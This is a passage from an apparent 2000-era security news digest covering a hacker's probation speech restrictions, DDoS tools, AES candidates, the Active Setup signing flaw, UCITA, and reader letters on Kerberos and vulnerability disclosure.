      submitted a request to his supervisor, they made an executive decision
      not to send it to the judge, to deny any further participation as a
      writer for technology or as a speaker. The April 12th letter confirmed
      that they had changed their mind.
      
      Q: What would the consequences be if you violated the terms of the
      letter?
      
      A: It's clear if I violate their directive I will be back in court and
      they will try to put me back in jail.
      
      Q: Why do you think they've given you this prohibition?
      A: The conditions of my probation are that I couldn't act as computer
      consultant or advisor, and the probation department is interpreting
      that to be that I'm not allowed to speak or write about technology.
      The ironic thing is that on March 2nd I testified before the Senate
      government affairs committee and assisted that committee on
      information security. Why would I get permission to assist the
      government in that regard but when I'm trying to support myself by
      assisting the private sector I'm told I can't do this type of work?
      And it's not only work--they didn't distinguish between paid and
      unpaid (activities). I'm being told I'm not allowed to work as a
      journalist or participate in speaking engagements period. I think it
      goes beyond computers because I was invited to Carnegie Mellon to
      speak on civil rights and that was denied as well.
      
      Q: Do you think the decision is fair?
      A: Of course not. The First Amendment granting the right to express
      yourself is pretty much sacred in this country. That's why it's the
      First Amendment. I believe that what I have been doing in engaging in
      speaking engagements and writing op-ed pieces for Time and Newsweek is
      for the public good because I have been able to express why I think
      Internet security is important. It is helpful to corporations and
      individuals to get some insight from my background as a computer
      hacker. What I'm trying to do is make a positive contribution by
      educating people about the threats that are out there and letting them
      protect themselves. It's a shame and a disappointment that they won't
      let me do that.
      
      Q: Are you going to challenge the directive on First Amendment
      grounds?
      
      A: I can tell you that judges have broad discretion and could impose
      conditions that restrict fundamental rights. But only if those
      restrictions are primarily designed to protect the public or
      rehabilitate the offender. My argument is, what I've been doing about
      information security has pretty much been about helping people
      understand how to protect themselves. That's for the public good. And
      it helps in my rehabilitation because it means taking my skills to
      benefit society while at same time trying to make a living. So how
      this directive that I not participate in writing articles or even
      critiquing articles--I don't see how that condition is related to the
      dual goal of protecting the public and my rehabilitation.
      
      How would my speaking in front of a group of people and educating them
      on how to protect themselves be a danger to the public? If I were out
      there advocating how to break into computers I could understand the
      government's case. But it's the exact opposite.
      
      Q: Why do you think the government is doing this then?
      A: I have to think some people in the administrative offices of the
      department don't like my celebrity in the computer field, and are
      trying to prevent me from speaking or writing about technology so that
      my celebrity status will die down. But I never discus my unauthorized
      access during these talks. I'm not telling the story of my crime at
      all.
      
      Q: What are your plans in light of this directive?
      A: I have an attorney assisting me in preparing a motion that we're
      going to file in federal court to get this clarified. I am being
      ordered by a U.S. probation department (to refrain) from being a
      journalist or accepting speaking engagements, but at the restitution
      phase of my trial I had the prosecutors arguing that I could profit as
      journalist so they could ask for more restitution.
      
      Q: What's next for you?
      A: Hopefully we're working on getting this back into court, and
      hopefully the court will be reasonable. If I can't speak and write, I
      don't know what I'll do.

300.0 [ISN] RealNetworks patches video server vulnerability
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://news.cnet.com/news/0-1005-200-1727494.html?tag=st.ne.1002.bgif.1005-200-1727494
      
      By Paul Festa
      Staff Writer, CNET News.com
      April 21, 2000, 10:40 a.m. PT
      
      Streaming media giant RealNetworks this morning posted a patch for a
      flaw in its video servers that leaves them vulnerable to crippling
      attacks.
      
      The flaw permits what is known as a "denial-of-service" attack against
      specific RealServers. A denial-of-service attack is one that floods a
      server with a volume of bogus requests or that exploits a
      vulnerability so that it can't respond to legitimate demands for
      information.
      
      A Buenos Aires-based security firm called Underground Security Systems
      Research (USSR) posted a demonstration exploiting the flaw and a
      notification to the Bugtraq security mailing list.
      
      RealNetworks learned of the vulnerability and the demonstration
      exploit, dubbed "realdie.exe," through the Bugtraq post yesterday and
      finished work on its remedy last night. Patches can be downloaded
      here.
      
      "As soon as we found out about it, we deployed a tiger team to analyze
      it, created a fix, put it through quality assurance testing, and
      posted it," a RealNetworks representative said. "We had a group of
      developers focused on it for the day. We treat all of these things
      very seriously."
      
      The denial-of-service attack and its cousin, the distributed
      denial-of-service attack, gained notoriety this year after attacks
      brought down major Web sites including Yahoo, eBay and Amazon.com.
      
      In this case, RealNetworks customers did not suffer actual attacks, as
      far as the company knows. But the release of the demonstration exploit
      was timed to embarrass RealNetworks in retaliation for its privacy
      policies, according to the security firm.
      
      USSR, citing two CNET News.com stories on the subject of RealNetworks'
      privacy policies, wrote in its advisory that it had not notified the
      company before going public with the vulnerability.
      
      USSR said it had not given RealNetworks the customary heads-up on the
      vulnerability "for the reason of previous reports of RealNetworks user
      privacy invasion."
      
      RealNetworks called USSR's aggressive move groundless.
      
      "We never invaded anyone's privacy, so it doesn't make a lot of
      sense," said the company representative. "We never kept track of what
      music people were listening to or kept track of individuals."
      
      RealNetworks is urging all customers to take precautions against the
      exploit.
      
      "We think everybody should download that patch," the representative
      said. "You always want to treat these things seriously."

301.0 [ISN] Group behaviour and security
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      NETWORK WORLD FUSION FOCUS: M. E. KABAY on SECURITY
      
      Today's Focus: Group behavior and security
      04/20/00
      
      In this series of articles, we are exploring how social psychology
      helps practitioners implement information security policies more
      effectively.
      
      Why do we refer to some groups of people as teams but to others as
      gangs? How can we use social psychological insights into group
      behavior to improve our success rates for information security
      policies?
      
      Early studies of how being in a group affects people's behavior
      yielded contradictory findings: Sometimes people did better at their
      tasks when there were other people around, and sometimes they did
      worse.  Eventually, social psychologist Robert Zajonc realized that
      "the presence of others is arousing, and this arousal facilitates
      dominant, well-learned habits but inhibits nondominant, poorly-learned
      habits."
      
      This means that in teaching employees new habits, it's
      counterproductive to put them into large groups. The inhibitory effect
      of groups in the early stages of behavioral change can be avoided when
      learning is individualized (for example, by using computer-based
      training programs and instructional videotapes).
      
      Another branch of research in group psychology deals with "group
      polarization." Groups tend to make more extreme decisions than the
      individuals in the group would have made. When a group discusses the
      need for security, group polarization can result in the group's
      deciding to take more risks - by reducing or ignoring security
      concerns - than any individual would have judged reasonable. Again,
      one-on-one discussions about the need for security may be more
      effective than large meetings in building a consensus that supports
      cost-effective security provisions.
      
      In the extreme, a group may engage in "groupthink," a decision-making
      process in which a premature consensus is reached because of the group
      members' strong desire for social cohesion. When groupthink prevails,
      evidence contrary to the dominant, received view is discounted,
      opposition is viewed as disloyal, and dissenters are discredited.  
      Especially worrisome for security professionals is the fact that
      people in the grip of groupthink tend to ignore risks and
      contingencies. To prevent groupthink and the poor decision making that
      is associated with it, the group's leader must remain impartial and
      encourage open debate.  Experts from the outside (for example,
      respected security consultants)  should be invited to address the
      group, bringing their own experience to bear on the group's
      requirements. After a consensus has been achieved, the group should
      meet again and focus on playing devil's advocate to try to come up
      with additional challenges and alternatives.
      
      In summary, security experts who want to help groups function as
      successful teams with respect to security issues should pay attention
      to group dynamics and be prepared to counter any group responses that
      interfere with individuals' acceptance of information security
      policies.

      Record encryption puzzle cracked -- finally
      
      The broken encryption method is widely expected to secure
      next-generation wireless devices. But is the break such bad news?
      
      By Robert Lemos, ZDNet News
      UPDATED April 13, 2000 3:57 PM PT
      
      An encryption method widely expected to secure next-generation
      wireless phones and other devices succumbed to a brute-force
      collaborative effort to break it, announced a French research agency
      on Thursday. An international team of researchers -- led by crypto
      researcher Robert Harley of the French National Institute for Research
      in Computer Science and Control, or INRIA -- and other computer
      enthusiasts found the 108-bit key to a scrambled message after four
      months of number crunching by 9,500 computers worldwide.
      
      "It's the largest collaborative effort yet," said Rohit Khare,
      president of security research group 4-K Associates, which took part
      in the project. "While SETI@home may have a larger number of computers
      involved, by number of computations applied, we were larger."
      SETI@home allows home computer users to participate in an effort to
      search for extraterrestial life.
      
      The project was completed on April 4, when the researchers realized
      they had found the key. Security firm Certicom Corp. sponsored the
      effort and will award the researchers $10,000, most of which has
      already been pledged to the non-profit Apache Web project.
      
      The encryption method -- known as elliptic-curve cryptography, or ECC
      -- is on track to be used in a number of wireless applications
      including phones, handheld organizers and digital wireless wallets,
      Khare said.
      
      Such applications benefit from the fact the algorithm requires little
      computational muscle to encode and decode data compared to other
      methods, making it ideal for the underpowered processors typically
      found in mobile devices.
      
      Cracking the code is not so easy, however. If someone tried to test
      out the effectiveness of ECC using a midrange PC, it would take almost
      500 years to complete.
      
      "That's why collaborative efforts like this are important," said
      another project member, B.K. DeLong, research lead at ZOT Group, a Web
      consulting firm. "It allows the community to mobilize and create a
      network of distributed computing power to solve the problem together."
      
      DeLong used two computers at home and several at a computer lab to
      calculate about 6,000 possible solutions, or "points," for the
      project. In total, the project required more than 2 million such
      points to find the solution.
      
      In practice, the encryption standard for wireless devices is expected
      to be at least a million times stronger than that, said 4-K Associates
      Khare. "This is key technology for the wireless future. What we did
      was to take a step in proving that future is secure."
      
      Certicom could not comment on the solution, as the company is still in
      a quiet period preceding its initial public offering.

303.0 [ISN] Expert warns of powerful new hacker tool
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://news.cnet.com/news/0-1003-200-1798064.html?tag=st.ne.1002.tgif.1003-200-1798064?st.ne.fd.gif.e

      A potent new software tool has emerged for launching attacks similar
      to, but more lethal than, the ones that took down Yahoo and other
      major Web sites in February.
      
      The new tool, called "Mstream," joins Trinoo, TFN2K, Stacheldraht,
      Shaft and other programs made to launch "distributed denial of
      service" (DDoS) attacks.
      
      In a DDoS attack, a programmer secretly embeds software into hundreds
      or thousands of computers. At a designated command or time, infected
      host computers send messages to a target computer. The volume of
      messages arriving over the Internet effectively knocks out the target
      server, making the Web site inaccessible to other Net surfers.
      
      Although Mstream apparently is still in the early stages of
      development, the core attack engine is more powerful than the existing
      attack software tools, said Dave Dittrich, a University of Washington
      computer administrator who helped in an analysis of Mstream.
      
      One side effect of the new program is that it potentially can complete
      a successful attack using fewer computers than did earlier tools. The
      software "will be disruptive to the victim...even with an attack
      network consisting of only a handful of agents," Dittrich said.
      
      The new software is the latest episode in an ongoing battle between
      the programmers who continually create more powerful versions of
      attack tools and the companies and law enforcement officials trying to
      stay a step ahead.
      
      DDoS attacks have waned since a series of high-profile assaults in
      February, but they have not ceased. AboveNet was attacked last week,
      for example.
      
      A Canadian teenager has been arrested in connection with an attack on
      CNN's Web site, but it's not clear whether he was involved in the
      similar attacks that brought down the FBI's Web site, Yahoo,
      Amazon.com, eBay, Buy.com, E*Trade and Datek Online.
      
      Often, the person launching an attack and the programmer who invented
      the software are not associated. Instead, programmers often develop
      these tools and then post them on the Web.
      
      Mstream can hurt not only the target computer but also the network of
      attacking host computers. At root is a protective technique called
      "egress filtering," in which the computers try to discard the packets
      sent in the attack. But egress filtering itself can burden the network
      equipment of the attacking computer's Internet site.
      
      "The lesson here is that there is no 'quick fix' to DDoS in the form
      of simple technical filtering solutions," Dittrich said.
      
      Dittrich based his analysis on a copy of Mstream found running on a
      Linux computer at a major university in late April, Dittrich said. The
      computer was attacking more than 12 Web sites at the time, he said.
      
      Mstream is "in early development stages, with numerous bugs and an
      incomplete feature set compared with any of the other listed tools,"
      Dittrich said.
      
      Dittrich, the victim of a 1999 DDoS attack, said he discovered Mstream
      two weeks ago. He was prompted to post his analysis earlier than
      planned because an anonymous person posted the 987-line program to the
      Bugtraq computer security mailing list Saturday.

304.0 [IND] mstream source and analysis
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Subject: Source code to mstream, a DDoS tool
      
      It's been alleged that this source code, once compiled, was used by
      persons unknown in the distributed denial of service (DDoS) attacks
      earlier this year.  Obviously such a thing cannot be confirmed aside from
      through a process of targeted sites making an appropriate comparison
      between the traffic this software would generate and the traffic they
      actually received.
      
      The code was made available anonymously to us (ie we didn't write it and
      don't know who did) and is hereby made available anonymously to AusCERT,
      CERT, CIAC, Mr David Dittrich (who carried out analyses on binary versions
      of the trinoo, tfn2k and stacheldracht DDoS tools around the 1999/2000 New
      Year period), as well as several other "full disclosure" mailing
      lists/forums.  It's not known if this source code has seen the light of
      day prior to now, so your mileage will definitely vary.
      
      -Anon
      
      PS: Sad to think that the hopes of the US economy ride unknowingly on
      the back of an inability of overvalued, overrated "dot.coms" to protect
      against someone writing such a simple piece of code like this and using
      it against them.  Companies used to have contingency plans to deal with
      adversity.  Now they use the long, flailing arm of the law (the FBI) and
      the excuse of "hackers" to conceal their depthless technology and security
      planning from the rigors of Wall Street and the NASDAQ.

               AES News
      
      The Advanced Encryption Standard (AES) is the forthcoming encryption
      standard that will replace the aging DES.  In 1996, the National
      Institute of Standards and Technology (NIST) initiated this program.
      In 1997, they sent out a call for algorithms.  Fifteen candidates were
      accepted in 1998, whittled down to five in 1999.  This past week was
      the Third AES Candidate Conference in New York.  Attendees presented
      23 papers (in addition to the 7 AES-related papers presented at Fast
      Software Encryption earlier in the week) and 12 informal talks (more
      papers are on the AES website), as NIST prepares to make a final
      decision later this year.
      
      Several of the algorithms took a beating cryptographically.  RC6 was
      wounded most seriously: two groups were able to break 15 out of 20
      rounds faster than brute force.  Rijndael fared somewhat better: 7
      rounds broken out of 10/12/14 rounds.  Several attacks were presented
      against MARS, the most interesting breaking 11 of 16 rounds of the
      cryptographic core.  Serpent and Twofish did best: the most severe
      Serpent attack broke 9 of 32 rounds, and no new Twofish attacks were
      presented.  (Lars Knudsen presented an attack at the FSE rump session,
      which he retracted as unworkable two days later.  Our team also showed
      that an attack on reduced-round Twofish we presented earlier did not
      actually work.)
      
      It's important to look at these results in context.  None of these
      attacks against reduced-round variants of the algorithms are
      realistic, in that they could be used to recover plaintext in any
      reasonable amount of time.  They are all "academic" attacks, since
      they all show design weaknesses of the ciphers.  If you were using
      these algorithms to keep secrets, none of these attacks would cause
      you to lose sleep at night.  If you're trying to select one of five
      algorithms as a standard, all of these attacks are very interesting.
      
      As the NSA saying goes: "Attacks always get better; they never get
      worse."  When choosing between different algorithms, it's smarter to
      pick the one that has the fewest and least severe attacks.  (This
      assumes, of course, that all other considerations are equal.)  The
      worry isn't that someone else discovers another unrealistic attack
      against one of the ciphers, but that someone turns one of those
      unrealistic attacks into a realistic one.  It's smart to give yourself
      as large a security margin as possible.
      
      Many papers discussed performance of the various algorithms.  If
      there's anything I learned, it's that you can define "performance" in
      all sorts of ways to prove all sorts of things.  This is what the
      trends were:
      
            In software, Rijndael and Twofish are fastest.  RC6 and MARS are
      also fast, on the few platforms that have fast multiplies and
      data-dependent rotates.  They're slow on smart cards, ARM chips, and
      the new Intel chips (Itanium and beyond).  They're fast on Pentium
      Pro, Pentium II, and Pentium III.  Serpent is very slow everywere.
      
            In hardware, Rijndael and Serpent are fastest.  Twofish is good.
      RC6 is poor, and MARS is terrible.
      
      The only two algorithms that had such implementation problems that I
      would categorically eliminate them were Mars and RC6.  MARS is so bad
      in hardware that it would be a disaster for Internet applications, and
      RC6 is close.  And both algorithms just don't fit on small smart
      cards.  (The RC6 team made a comment about being suitable for
      cheap--$5--smart cards.  I am talking about $0.25 smart cards.)
      
      I would increase the number of rounds in Rijndael to give it a safety
      margin similar to the others.  Either Serpent, Twofish, and 18-round
      Rijndael would make a good standard, but I think that Twofish gives
      the best security to performance trade-off of the three, and has the
      most implementation flexibility.  So I support Twofish for AES.
      
      The deadline for comments is May 15.  I urge you to comment.  As many
      of the papers and comments indicate, this decision is more about
      suitability than security.  NIST needs to know what is important to
      you: efficiency on cheap 8-bit smart cards, key agility in hardware,
      bulk encryption speed, gate count in hardware, etc.  If you like the
      idea of multiple algorithms, tell them.  If you don't, tell them.
      Once NIST chooses an AES we're all going to be stuck with it;
      customers will demand that products be "AES compatible."  Now's your
      chance to influence how onerous that demand will be.

      "MARS Attacks! Preliminary Cryptanalysis of Reduced-Round MARS
      Variants"
      
      J. Kelsey and B. Schneier, Third AES Candidate Conference, 2000, to
      appear
      
      In this paper, we discuss ways to attack various reduced-round
      variants of MARS.  We consider cryptanalysis of two reduced-round
      variants of MARS:  MARS with the full mixing layers but fewer core
      rounds, and MARS with each of the four kinds of rounds reduced by the
      same amount.  We develop some new techniques for attacking both of
      these MARS variants.  Our best attacks break MARS with full mixing and
      five core rounds (21 rounds total), and MARS symmetrically reduced to
      twelve rounds (3 of each kind of round).

             The Doghouse:  Cyber Security Information Act
      
      This bill--HR 4246--shields information about network insecurities,
      transferred from industry to the government, from Freedom of
      Information Act requests.  This kind of thinking flies in the face of
      the full-disclosure movement that has resulted in thousands of
      security bugs being fixed over the past several years, and moves us
      back to a world of manufacturers keeping vulernabilities secret and
      not bothering to fix them.  It also facilitates a government database
      of security vulnerabilities, that they can use to invade citizens'
      privacy.  It also will make it much harder to design open security
      standards; government agencies will be much more likely to say things
      like: "You should design it this way, but we can't tell you why."
      Historically, public disclosure has proven to be the best way to
      increase security.  Laws that reverse that trend are a bad idea.

             Microsoft Active Setup "Backdoor"
      
      
      When you install the Microsoft Internet Explorer browser 4.0 or higher
      on Windows, you automatically get something called "Active Setup," a
      Microsoft-signed ActiveX control.  This control is designed to
      automatically install and update software, including IE.  It does so
      by reading installation instructions and installable parts from a
      signed CAB (archive) file.  A user-configurable setting in MSIE
      determines if a user confirmation dialog occurs for each remotely
      initiated Active Setup install.  In other words, if you choose, you
      are always warned before Active Setup does something.
      
      This is somewhat scary, but straightforward.  However, Juan Carlos
      Garcia Cuartango discovered something strange.  If the CAB is signed
      by Microsoft itself, rather than a third-party Microsoft-certified
      signer, then the user-confirmation setting is ignored.  Such CABs
      elicit no confirmation dialog -- the software is ALWAYS installed.
      That is, Microsoft-signed Active Setup installs can't be declined or
      confirmed, and they can occur silently and secretly.
      
      This is very scary, but it gets worse.  Any signer can instruct Active
      Setup to install parts from valid Microsoft-signed CABs, and it will
      happily comply, regardless of where those instructions come from.
      Anyone can instruct Active Setup to mix parts (data, executable, even
      DLLs) from any CAB previously signed by Microsoft.  Active Setup will
      comply, acting quietly and without confirmation, just as if the
      instructions came from Microsoft.  It only seems to matter that the
      parts and the install-instructions are signed, not that they are from
      different origins or are signed by different signers.  It's as if you
      made a new message by piecing together words and phrases from a series
      of signed messages, and the result appeared to be signed because all
      its original parts were signed.  Given the research on Java applets
      that demonstrate how individually secure applets can interact to yield
      insecure results, this is a problem.
      
      Fixes:  It's not enough for the installed parts to be signed.  It's
      not even enough for the instructions driving the install to be signed.
      It's the combination that counts, so it's the combination that must be
      signed.  But even that isn't enough.  The Active Setup Control should
      only install things that it has signed permission for FROM THE ORIGIN.
      For example, if some signer wants to install a Microsoft component
      from another CAB, then that signer must have a signed statement from
      Microsoft that the component can be independently installed by that
      specific signer for that specific purpose.  In short, to install any
      component from another CAB requires the explicit permission of that
      CAB's signer.

         The Uniform Computer Information Transactions Act (UCITA)
      
      
      
      Virginia Gov. James S. Gilmore III signed the UCITA, and it is now law
      in Virginia.  The Maryland legislature overwhelmingly passed the bill,
      and it is on its way to become law in that state.
      
      I put this horrible piece of legislation in the Doghouse last month,
      but it's worth revisiting one portion of the act that particularly
      affects computer security.
      
      As part of the UCITA, software manufacturers have the right to
      remotely disable software if the users do not abide by the license
      agreement.  (If they don't pay for the software, for example.)  As a
      computer-security professional, I think this is insane.
      
      What it means is that manufacturers can put a back door into their
      products.  By sending some kind of code over the Internet, they can
      remotely turn off their products (or, presumably, certain features of
      their products).  The naive conceit here is that only the manufacturer
      will ever know this disable code, and that hackers will never figure
      the codes out and post them on the Internet.
      
      This is, of course, ridiculous.  Such tools will be written and will
      be disseminated.
      
      Once these tools are, it will be easy for malicious hackers to disable
      peoples' computers, just for fun.  This kind of hacking will make Back
      Orifice look mild.
      
      Cryptography can protect against this kind of attack -- the codes
      could be digitally signed by the manufacturer, and the software
      wouldn't contain the signature key -- but in order for this to work
      the entire system has to be implemented perfectly.  Given the
      industry's track record at implementing cryptography, I don't have
      high hopes.  Putting a back door in software products is just asking
      for trouble, no matter what kinds of controls you try to put into
      place.
      
      The UCITA is a bad law, and this is just the most egregious provision.
      It's wandering around the legislatures of most states.  I urge
      everyone to urge everyone involved not to pass it.

      It is common to pick on Microsoft, but it would be fairer to pick on
      the entire commercial world.  Security, to a company that is trying to
      make money, is a PR issue, and only becomes a technical issue if and
      when bad PR is the alternative.  The reason is obvious; security costs
      lots of money to do right, and to most customers, the appearance is as
      good as the genuine article, not because they really don't care, but
      because they have no way of knowing the difference.  I cannot blame
      the companies for doing what they are meant to do; the fact that so
      many people refuse to admit the facts to themselves is more troubling.

      OpenBSD does this.  I am unaware of any other group whose workings are
      publicly viewable that does so, which is regrettable, because I would
      prefer not to have this appear as an OpenBSD plug; rather, my purpose
      is to point out that not only is this approach feasible, but it is
      being done.
      
      Note also that the attitude is much more mainstream than the skills or
      the stamina to act on it in practice.  There are security groups
      associated with every product of any significance, but most of them,
      well intentioned and eager as they may be, talk a lot and don't do
      much.  This is too bad, because if more of them did, it wouldn't be
      too long before consumers began to understand the value this can
      provide, albeit without any real understanding of the means by which
      it is accomplished.
      
      By the way, consumer understanding is not one big thing.
      Understanding a product is different from understanding what it does,
      how, and how well.  Consumers do not have to be experts on security or
      reliability; what is needed is reasonably objective third party
      information on these subjects, such as people like yourself can
      provide.  Notice that cars known for safety, reliability, and fuel
      economy are the best sellers, despite the fact that most customers
      don't pay too much attention to the actual mileage they get and have
      no real way to evaluate for themselves the safety or reliability of
      such a complex product.  Of course, the dissemination infrastructure
      takes time to develop and more time to rid itself of bozo wannabes,
      but this is the direction in which to head.
      
      
      From: "Andrew D. Fernandes" <andrew@cryptonym.com>
      Subject: Simple vs Complex
      
      My mathematical background is in the area of "dynamical systems", more
      popularly known as "chaos theory".  One of the tenets of research in
      dynamical systems is that "simple systems can have very complex
      dynamics".  How does that tenet affect the conclusions of your essay?
      
      Simply put, you are confusing a 'simple' system (a system that is easy
      to describe), with the 'simple' dynamical behaviour of the system.
      In other words, the system may be easy to describe, but the behaviour
      may be very difficult to describe.  The converse is also true: a
      system with a very complex description may have very simple dynamical
      behaviour.
      
      For instance, the usual example is the iterative map x[n+1] =
      -alpha*x[n]*(x[n]-1), for 0 <= x <= 1, 0 <= alpha <= 4.  This is a
      "simple"  system, in that it is easy to describe.  But the dynamics of
      the system are very complex.  Hundreds of research papers have been
      written to describe and understand the sequence of x[0], x[1], x[2],
      ... and more come every day.  In fact, the behaviour of this quadratic
      map is complicated enough to be the cornerstone of modern "chaos
      theory"!
      
      In the context of security, our "system" is a Java applet, an ActiveX
      control, a Word macro, an SSL setup, or an IPSec session.  Then our
      "dynamical behaviour" is a measure of the security of the system.  We
      can simplify the security properties of the system as much as we like,
      but the overall dynamics of the security can be, and probably will be,
      very complex.
      
      So, although I agree that only simple systems can be secure, I
      disagree that you can build systems with simple behaviour by using
      systems that are easy to describe.  You're fooling yourself: the
      tiniest change to a simple system can make its dynamics hideously
      complicated.  In the quadratic map, very small changes to alpha make
      enormous changes on how the system behaves.
      
      In reality, you can build secure complex systems by ensuring that the
      dynamics of the security properties of the system remain simple.
      That goal is related, but definitely not identical, to the goal of
      building a system with a simple description.  To build complex systems
      with simple behaviour, you need to modularize not just the system, but
      the system's behaviour...  but discussing how to do that, in either an
      abstract mathematical or pragmatic programming point of view, is
      beyond the scope of this note.
      
      
      From: Clifford Neuman <bcn@isi.edu>
      Subject: Microsoft Kerberos
      
      There have been many articles and much commentary faulting Microsoft
      for extending the Kerberos standard in ways that are purportedly
      incompatible with existing implementations.  Such commentary also
      attributes to Microsoft the motives of forcing the use of their
      Kerberos implementations by anyone wanting to inter-operate with
      Win2K.  Though Microsoft has been dragging its feet publishing the
      details of the contents of the authorization data and how they are
      using it, in my opinion, their extensions are consistent with the
      Kerberos Internet draft, and their use of the authorization data field
      is consistent with its original intent.
      
      There is not currently a standard for representing group information
      in the authorization data field of Kerberos tickets, so I can't fault
      Microsoft for developing their own.  As part of the design and release
      of the authorization components of Win2K, they registered identifiers
      for their authorization data elements, and discussed the high level
      architectural issues of their use with myself and others in the
      Kerberos community.  This is highlighted by the fact that their early
      design called for an interpretation of the authorization data field
      that was inconsistent with its defined use and intent.  After
      discussion (and before they implemented), we worked out an extension
      that 1) preserved the original intent, 2) significantly improved the
      usability of the authorization data field for authorization by
      anybody, not just Microsoft, and 3) is specified in the current
      Internet draft revising the Kerberos specification.
      
      Regarding the security of Microsoft's Kerberos implementation, I am
      not aware of any protocol changes that have been made that affect the
      security of Kerberos.  I do have some concerns about the storage of
      KDC keying material in active directory, but that is an implementation
      and not a protocol issue, and Microsoft claims to have taken steps in
      the design to prevent access to the keys by other than the KDC.  I
      have not looked in detail at these steps, however.
      
      Regarding some of the naming issues, I think that there were some
      interoperability issues caused by differences in naming, but I also
      believe that Microsoft issued fixes to address this incompatibility.
      Similar problems arose with interoperability between DCE and raw
      Kerberos, and it doesn't surprise me that reaching full
      interoperability in light of the inherent naming differences in other
      parts of the system might take several revisions to work out.
      
      Regarding name canonicalization, the changes Microsoft is making
      address some security relevant limitations that Kerberos has had
      regarding the mapping of server names to principal names (this is
      something that Kerberos was never originally intended to address).
      The Microsoft proposals in this area have been submitted in the
      context of the IETF, and I am confident that the changes will be
      reflected in standards track documents.
      
      More generally on the interoperability front, Microsoft has worked
      closely with CyberSafe to demonstrate interoperability for user
      authentication by CyberSafe's customers using existing CyberSafe KDCs
      on non Win2K platforms.
      
      I have found the individuals at Microsoft who have been working on
      Kerberos have contributed positively to the standards process in the
      IETF.  These individuals want true interoperability, and have acted in
      good faith.  The use of the authorization data field IS consistent
      with both the letter and intent Kerberos specifications, and I am
      happy to see some of the authorization ideas for which the
      authorization data field was intended to be gaining widespread use.
      However, I do fault Microsoft for not yet publishing the details of
      their use of the authorization data field as they have repeatedly
      promised, and I hope that the community and the press will continue to
      pressure them to publish the specification as an informational RFC.
      
      
      From: Martin Rex <martin.rex@sap-ag.de>
      Subject: Microsoft Kerberos
      
      I do not agree with most of the complaints about Microsoft's Kerberos
      implementation in Windows 2000.  I have been looking at and testing
      with Microsoft's W2K Kerberos quite a bit and here are my findings:
      
      - I haven't noticed interoperability problems with MIT Kerberos 5
      v1.0.5.  One may not be able to access W2K file shares or services
      with tickets from a non-Microsoft KDC, but that's not a problem of the
      authentication, but of the ACLs which the Microsoft services use to
      grant access to these resources.  Applications that rely on name-based
      authentication will work on W2K as one would expect, and W2K-based
      clients can access applications on Unix that grant access via
      name-based authentication.
      
      - MS W2K Kerberos IS compliant to rfc1964 (the Kerberos5 gssapi
      mechanism).  With a suitable SSPI-wrapper (which I've written and
      which my company is going to give away for free), a portable GSS-API
      aware application will not notice any differences between a Microsoft
      W2K Kerberos and an MIT Kerberos 5. There may be a tiny cosmetic issue
      regarding "service names".  However these are messy and non-standard
      across all existing Kerberi.
      
      - the normal "name-based" authentication will work just fine with W2K
      clients when talking to applications on Unix, provided that one is
      using the GSS-API.  I wrote the W2K Kerberos SSP wrapper for exactly
      this purpose.
      
      - the (admittedly still undocumented) extension with the authorization
      data is necessary to permit the enforcement of POSIX ACLs by the TCB,
      which is how applications on Microsoft Windows NT platforms should do
      authorization according to Microsoft (keyword: Impersonation).
      Microsoft is not the first to implement POSIX ACLs, DCE did that a
      while ago.  Although they used an additional ticket (a PTGT), the
      effect is the same.  Both, DCE and W2K Kerberos still support the
      traditional name-based authentication.  Personally, I dislike
      Impersonation, because that means that a low-privileged Server will
      get a boost in permissions simply when an (domain-)admin connects.
      Combine that with automatic delegation (which may have happened with
      W2K), then connecting to other machines on the network becomes a
      serious security problem.
      
      - the one serious problem with name-based authentication in W2K
      Kerberos is, that the administrative Tools, when a user with a certain
      logon name leaves, do not prevent the administrator to immediately
      reissue this logon name for a new user.  This may cause problems with
      the ACLs of applications that perform name-based authentication. On
      Microsoft Windows NT platforms, ACLs contain UUIDs and/or SIDs, not
      names.  There seems to be the tradition with POSIX ACLs that you
      orphan ACL entries on a regular basis and don't care about it.

      Subject: Security by obscurity
      
      I know you are a big fan of the security by obscurity approach so I
      thought you would be interested in this reference to Cisco's PIX that
      I came across in
      
      http://208.201.97.5/ref/hottopics/security/firewalls.html.
      
      The article by Brian Robinson is about Firewalls and goes on to say...
      
      "Unlike Windows NT or Unix-based firewalls, the PIX was built from
      scratch, and the source code is closely guarded," said Eric
      Woznysmith, a consultant systems engineer in security network
      management with Cisco's federal operations.  "Only a dozen or so
      people around the world have seen it.  There have been no known
      break-ins through PIX firewalls."
      
      The PIX firewall is used throughout the government, particularly in
      intelligence and law enforcement agencies, Woznysmith said, and is
      "heavily used" within DOD.  Given its success, he said, Cisco expects
      more vendors to offer their own proprietary boxes.

      I agree with the first part of the mail, a month seems a good delay
      before publishing a kiddy script, it lets enough time for the vendor
      to react.  Where I can't agree is here :
      
       >Publishing is *very important* in these cases so the
       >stakeholders know to reduce their trust in these systems.
       >If air traffic control is vulnerable, tell me so I can
       >stop taking airplanes!
      
      First, there are the people who don't have the information, for
      different reasons (no computer, hollidays, ...) or who are obliged to
      use the airplanes (inter-continental business travel). So you will
      avoid airplanes, but some won't (and not because of non disclosure)
      and are still at risk.
      
      If air traffic is vulnerable, it's not about stopping all airplanes
      that use this system, because this is impossible. It's about letting
      time to system administrators/vendors to produce a fix. Here, you're
      playing with people life, because of what YOU do. The example you told
      about doesn't have anything in common with this one except for a
      technological failure.  But for your example, as you wrote, it's a
      non-life-safety version.
      
      If I buy a car, and there is a critical problem with the braking
      system, I would like to know it, because it's a life-safety problem,
      whether other people know it or not. But with the air traffic system,
      by publishing this vulnerability, you take the risk on other people
      life.
      
      Yes, I'm for publishing vulnerabilities, but only if two conditions
      are here :
      
      - It's not life-critical
      - I've first warned the vendor of it, and let time for him to fix it
      (let's say, 2 weeks before alerting more people) and, if the vendor
      doesn't care, even after publishing it, it could be ok to publish a
      kiddy script (let's say after another month)
      
      Moreover, you wrote this :
      
       >This is gun control: "Don't punish murder, ban the gun
       >instead! Exploits are an evil instrumentality ! Exploits
       >help a good boy go bad!" The right answer is: Humans are
       >held responsible for their behavior. Guns, bricks, and
       >exploits are just tools.
      
      Here again, I strongly disagree. The H-bomb may be just a tool, but
